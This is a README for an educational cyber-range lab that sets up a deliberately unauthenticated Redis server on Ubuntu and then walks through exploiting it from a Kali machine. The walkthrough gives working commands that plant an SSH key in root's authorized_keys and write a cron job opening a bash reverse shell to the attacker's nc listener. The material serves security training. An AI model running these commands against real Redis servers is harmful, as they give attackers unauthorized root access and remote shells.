# Redis Unauthorized Access Lab

This lab demonstrates how a misconfigured Redis instance (no authentication, bound to all interfaces) can be exploited to achieve root-level code execution by abusing Redis's `CONFIG` command to write arbitrary files.

## Detailed Deploying Steps

### Deploy the Cyber Range Environment

1. In the "Model Editor" interface of the SPHERE platform, deploy the following model.
    ```python
    from mergexp import *

    net = Network('Redis-Unauth-Lab', addressing==ipv4, routing==static)

    attacker = net.node('attacker', image=='kali', proc.cores>=8, memory.capacity>=gb(32))
    victim = net.node('victim', image=='2404', proc.cores==2, memory.capacity==gb(2))

    link = net.connect([attacker, victim])

    link[attacker].socket.addrs = ip4('10.0.0.1/24')
    link[victim].socket.addrs   = ip4('10.0.0.2/24')

    experiment(net)
    ```

2. Create a Reservation based on that model.

3. Activate the Reservation.

4. If the Ubuntu 24.04 root disk is not automatically expanded, run on the victim machine:
    ```
    sudo partprobe
    sudo resize2fs /dev/vda3
    ```

### Deploy the Target Victim Machine

0. [Install Ansible](../setup_ansible/readme.md) on your XDC before proceeding.

1. The [`inventory.ini`](inventory.ini) is pre-configured to use SPHERE's DNS short name — no IP address lookup needed:
    ```ini
    [redis_vm]
    redis-target ansible_host=victim.infra ansible_user=lexuswang ansible_become_pass=lexuswang

    [redis_vm:vars]
    ansible_python_interpreter=/usr/bin/python3
    ```
    `victim.infra` automatically resolves to the victim's infranet address via SPHERE DNS. Update `ansible_user` and `ansible_become_pass` if your SPHERE username differs from `lexuswang`.

2. Run the playbook:
    ```bash
    ansible-playbook -i inventory.ini redis_unauth_target.yml --ask-become-pass
    ```

### Deploy the Attack Machine

Please refer to this [doc](../attacker_setup/readme.md) to set up the attack machine.

---

## Detailed Information about the Target System

**Service:** Redis (no authentication)

**Vulnerability Type:** Misconfiguration — Redis bound to `0.0.0.0`, no `requirepass`, no `protected-mode`, `enable-protected-configs yes`

**CVE:** No CVE (this is a well-known Redis misconfiguration pattern, not a software bug)

**Port:** 6379

**Victim experiment network IP:** `10.0.0.2` (fixed in `merge_model.py`)

**Why it's dangerous:** Redis's `CONFIG SET` command lets any connected client change the database save path and filename at runtime. When Redis runs as root, an attacker can overwrite `/root/.ssh/authorized_keys` or `/var/spool/cron/crontabs/root` to gain OS-level code execution without any credentials.

> **Note on Redis 7.x:** Redis 7.0+ moved `dir` and `dbfilename` to "protected configs" that cannot be changed at runtime by default. This lab sets `enable-protected-configs yes` in `redis.conf` to restore the classic vulnerable behavior.

---

## Testing (from attacker machine)

The victim's experiment network address is `10.0.0.2`. All commands below run on the Kali attacker machine.

### Step 1: Detect the Redis instance

```bash
nmap -sV -p 6379 10.0.0.2
redis-cli -h 10.0.0.2 ping
```

Expected output: `PONG` (no password required)

### Step 2: Exploit — Write SSH Public Key (Root Shell)

```bash
# Generate attacker SSH key pair
ssh-keygen -t rsa -f /tmp/redis_key -N ""

# Pad with newlines to survive RDB binary encoding
(echo -e "\n\n"; cat /tmp/redis_key.pub; echo -e "\n\n") > /tmp/pubkey.txt

# Write key into Redis
redis-cli -h 10.0.0.2 flushall
redis-cli -h 10.0.0.2 -x set pwned < /tmp/pubkey.txt

# Redirect Redis save location to /root/.ssh
redis-cli -h 10.0.0.2 config set dir /root/.ssh
redis-cli -h 10.0.0.2 config set dbfilename authorized_keys
redis-cli -h 10.0.0.2 save

# SSH in as root (no password needed)
ssh -i /tmp/redis_key -o StrictHostKeyChecking=no root@10.0.0.2
```

### Step 3 (Alternative): Exploit — Crontab Reverse Shell

```bash
# Start listener on attacker first
nc -lvnp 4444
```

In another terminal:
```bash
redis-cli -h 10.0.0.2 config set dir /var/spool/cron/crontabs
redis-cli -h 10.0.0.2 config set dbfilename root
redis-cli -h 10.0.0.2 set cron $'\n\n*/1 * * * * bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n\n'
redis-cli -h 10.0.0.2 save
```

Wait up to 60 seconds for the cron job to fire. A root shell will appear in the `nc` listener.

> **Tip:** If testing both methods, run `redis-cli -h 10.0.0.2 flushall` between attempts to clear the previous key value from the RDB file.

---

## Attack Chain

1. **Discovery:** Port scan finds Redis on 6379
2. **Verify Unauth Access:** `redis-cli PING` returns PONG without any password
3. **Enumerate:** `INFO server` reveals Redis version and OS details
4. **Abuse CONFIG:** Redirect save path to `/root/.ssh`
5. **Write SSH Key:** Plant attacker's public key as `authorized_keys`
6. **Root Access:** SSH in as root with the planted private key

---

## Credentials

| Account | Password |
|---------|----------|
| SSH `redisuser` | `redis123` |
| Redis | *(no password)* |
